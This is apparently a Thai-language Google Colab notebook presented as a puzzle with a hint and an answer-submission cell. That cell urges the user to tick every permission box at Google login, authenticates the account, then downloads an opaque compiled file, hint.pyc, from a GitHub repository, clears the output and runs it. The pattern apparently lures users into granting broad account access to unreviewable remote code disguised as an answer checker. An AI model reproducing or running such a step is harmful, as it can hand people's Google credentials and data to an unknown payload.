# %% [markdown]
# ## หากต้องการคำใบ้ จงแก้ปัญหาต่อไปนี้

# %% [markdown]
# ![image.png](data:image/png;base64,...)

# %% [markdown]
# รันโปรแกรมด้านล่างเพื่อใส่คำตอบ \
# ปล. ในขั้นตอนการล็อกอินโปรดติ๊กถูกทุกช่องด้วยเพื่อจะได้ไม่เกิดข้อผิดพลาดขึ้น \
# ![Screenshot 2024-05-10 150941.png](data:image/png;base64,...)
#
# ถ้าพร้อมใส่คำตอบแล้วล่ะก็คลิ๊กเลยยย!!! \
# 👇👇👇👇👇👇👇👇👇👇👇👇

# %%
from google.colab import auth
auth.authenticate_user()
from IPython.display import clear_output
# !wget https://github.com/supnnknow/hint/raw/main/hint.pyc
clear_output()
# !python hint.pyc
